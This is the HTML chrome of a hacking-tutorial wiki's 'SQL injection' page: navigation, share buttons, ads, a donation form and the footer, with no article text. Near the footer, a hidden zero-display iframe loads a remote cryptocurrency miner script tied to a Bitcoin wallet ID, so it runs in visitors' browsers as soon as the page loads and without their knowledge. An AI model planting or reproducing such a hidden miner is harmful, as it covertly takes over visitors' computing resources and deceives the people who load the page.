<script type="text/javascript">
function prog_toggle() {
   $('#prog_display_text').html($('#prog_hidden_display').html());
   $('#prog_hidetext').html($('#prog_hide_msg').html());
   $('#prog_hidetext').attr('onClick','prog_vape();');
}
function prog_vape() {
   $('#prog_display_text').html('');
   $('#prog_hidetext').html($('#prog_show_msg').html());
   $('#prog_hidetext').attr('onClick','prog_toggle();');
}
</script>
</p>
<div style="width:40%; border: 1px solid #000;">SQL injection is part of a series on <a href="/Programming" title="Programming" class="mw-redirect">programming</a>.<br />
<a id='prog_hidetext' onclick="prog_toggle();"><b>[ Decompile ]</b></a><br /><div id="prog_display_text"></div>
</div>
<div id="prog_hidden_display" style="display:none; height:1px; width:1px;">
<p><b><a href="/Compiled_languages" title="Compiled languages" class="mw-redirect">Compiled languages</a></b><br />
<a href="/Assembly_Basics" title="Assembly Basics" class="mw-redirect">Assembly</a> &#8226; <a href="/C" title="C">C</a> &#8226; <a href="/CPP" title="CPP">C++</a> 
</p><p><b><a href="/Interpreted_languages" title="Interpreted languages" class="mw-redirect">Interpreted languages</a></b><br />
<a href="/Perl" title="Perl">Perl</a> &#8226; <a href="/Python" title="Python">Python</a> &#8226; <a href="/Ruby" title="Ruby">Ruby</a> &#8226; <a href="/PHP" title="PHP">PHP</a> &#8226; <a href="/LUA" title="LUA">LUA</a> &#8226; <a href="/TCL" title="TCL">TCL</a> &#8226; <a href="/SQL" title="SQL">SQL</a> &#8226; <a href="/JavaScript" title="JavaScript">JavaScript</a> &#8226; <a href="/CSS" title="CSS">CSS</a> &#8226; <a href="/HTML" title="HTML">HTML</a>
</p><p><b><a href="/Assembly" title="Assembly">Assembly</a> &amp; <a href="/Shellcode" title="Shellcode" class="mw-redirect">shellcode</a></b><br />
<a href="/Linux_assembly" title="Linux assembly">Linux assembly</a> &#8226; <a href="/Out_of_Order_Code_Execution" title="Out of Order Code Execution">Out of Order Code Execution</a> &#8226; <a href="/Null-free_shellcode" title="Null-free shellcode" class="mw-redirect">null-free shellcode</a> &#8226; <a href="/Ascii_shellcode" title="Ascii shellcode">32-bit ascii shellcode</a> &#8226; <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">64-bit alphanumeric shellcode</a> &#8226; <a href="/Return_Oriented_Programming_(ROP)" title="Return Oriented Programming (ROP)">Return Oriented Programming (ROP)</a>
</p><p><b>Related Articles</b><br />
<a href="/Polymorphic" title="Polymorphic">Polymorphic</a> &#8226; <a href="/AJAX" title="AJAX">AJAX</a> &#8226; <a href="/JQuery" title="JQuery">jQuery</a> &#8226; <a href="/Bash_book" title="Bash book">Bash book</a> &#8226; <a href="/Unsafe_string_replacement" title="Unsafe string replacement">unsafe string replacement</a> &#8226; <a href="/SQL_orientation" title="SQL orientation">SQL orientation</a><br />
</p>
</div>
<div id="prog_hide_msg" style="visibility:hidden; height:1px; width:1px;"><b>[ Compile ]</b></div>
<div id="prog_show_msg" style="visibility:hidden; height:1px; width:1px;"><b>[ Decompile ]</b></div>
</center><center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
</div><div style="width: 25%; float: left; padding-top:5px;">
<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
(function() {
  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
  s.type = 'text/javascript';
  s.async = true;
  s.src = 'http://widgets.digg.com/buttons.js';
  s1.parentNode.insertBefore(s, s1);
})();
</script></div>
</div></span>
</center>
<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
</td>
<td>  It is a crime to use techniques or tools on this page against any system without written authorization unless the system in question belongs to you
</td></tr></table>

<!-- 
NewPP limit report
Preprocessor node count: 1232/1000000
Post-expand include size: 74215/2097152 bytes
Template argument size: 13637/2097152 bytes
Expensive parser function count: 0/100
-->
<div class="printfooter">
Retrieved from "<a href="http://www.blackhatlibrary.net/SQL_injection">http://www.blackhatlibrary.net/SQL_injection</a>"</div>
		<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks"><a href="/Special:Categories" title="Special:Categories">Categories</a>: <span dir='ltr'><a href="/Category:SQL_injection" title="Category:SQL injection">SQL injection</a></span> | <span dir='ltr'><a href="/Category:Exploitation" title="Category:Exploitation">Exploitation</a></span> | <span dir='ltr'><a href="/Category:Programming" title="Category:Programming">Programming</a></span> | <span dir='ltr'><a href="/Category:Web_exploitation" title="Category:Web exploitation">Web exploitation</a></span></div></div>		<!-- end content -->
				<div class="visualClear"></div>
	</div>
</div></div>
<div id="column-one">
	<div id="p-cactions" class="portlet">
		<h5>Views</h5>
		<div class="pBody">
			<ul>
				 <li id="ca-nstab-main" class="selected"><a href="/SQL_injection" title="View the content page [c]" accesskey="c">Page</a></li>
				 <li id="ca-talk"><a href="/Talk:SQL_injection" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
				 <li id="ca-viewsource"><a href="/index.php?title=SQL_injection&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
				 <li id="ca-history"><a href="/index.php?title=SQL_injection&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-personal">
		<h5>Personal tools</h5>
		<div class="pBody">
			<ul>
				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=SQL_injection" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-logo">
		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
	</div>
	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
	<div class='generated-sidebar portlet' id='p-Wiki'>
		<h5>Wiki</h5>
		<div class='pBody'>
			<ul>
				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
				<li id="n-Donate"><a href="/Donations">Donate</a></li>
				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
			</ul>
		</div>
	</div>
	<div class='generated-sidebar portlet' id='p-Community'>
		<h5>Community</h5>
		<div class='pBody'>
			<ul>
				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
			</ul>
		</div>
	</div>
	<div id="p-search" class="portlet">
		<h5><label for="searchInput">Search</label></h5>
		<div id="searchBody" class="pBody">
			<form action="/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
			</form>
		</div>
	</div>
	<div class="portlet" id="p-tb">
		<h5>Toolbox</h5>
		<div class="pBody">
			<ul>
				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/SQL_injection" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/SQL_injection" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
				<li id="t-print"><a href="/index.php?title=SQL_injection&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=SQL_injection&amp;oldid=41440" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
		</div>
	</div>
&nbsp;

<script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
/* BHL Sidebar */
google_ad_slot = "2730381272";
google_ad_width = 120;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>

<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<center>VPS-Heaven now accepting BitCoin!</center><br />
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-40369725-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
<br /><br /><center>Our research is made possible by your support.</center><br />
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form>
</div><!-- end of the left (by default at least) column -->
<div class="visualClear"></div>
<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
<div id="footer">
	<div id="f-poweredbyico">
		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
	</div>
	<ul id="f-list">
		<li id="lastmod"> This page was last modified on 18 October 2013, at 20:50.</li>
		<li id="viewcount">This page has been accessed 190,982 times.</li>
		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>

	</ul>
</div>
</div>

<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "SQL_injection", "wgTitle": "SQL injection", "wgAction": "view", "wgArticleId": 284, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 41440, "wgCategories": ["SQL injection", "Exploitation", "Programming", "Web exploitation"], "wgBreakFrames": false, "wgRestrictionEdit": ["sysop"], "wgRestrictionMove": ["sysop"]});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script type="text/javascript"> 
function toggleDisplay( id, hidetext, showtext )
{
  link = document.getElementById( id + "l" ).childNodes[0];
 
  with( document.getElementById( id ).style )
    {
      if( display == "none" )
	{
	  display = "inline";
	  link.nodeValue = hidetext;
	}
      else
	{
	  display = "none";
	  link.nodeValue = showtext;
	}
    }
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script><!-- Served in 4.629 secs. --></body></html>
